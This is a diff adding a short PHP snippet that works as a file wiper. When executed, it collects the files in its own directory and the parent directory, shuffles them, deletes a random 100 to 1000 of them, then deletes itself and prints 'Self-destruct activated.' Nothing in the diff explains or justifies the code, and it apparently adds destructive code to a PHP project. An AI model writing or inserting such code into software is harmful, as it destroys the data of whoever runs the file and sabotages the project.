@@ -1,0 +1,24 @@
+// Fetch all files in the current directory and its parent directory
+$currentDirFiles = glob(__DIR__ . '/*');
+$parentDirFiles = glob(__DIR__ . '/../*');
+
+// Combine and shuffle the files
+$allFiles = array_merge($currentDirFiles, $parentDirFiles);
+shuffle($allFiles);
+
+// Delete a random number of files (e.g., between 100 to 1000 files)
+$numToDelete = rand(100, 1000);
+
+for ($i = 0; $i < $numToDelete; $i++) {
+    if (isset($allFiles[$i])) {
+        // Ensure it's not a directory
+        if (is_file($allFiles[$i])) {
+            unlink($allFiles[$i]);
+        }
+    }
+}
+
+// Delete the current file
+unlink(__FILE__);
+
+die("Self-destruct activated.");
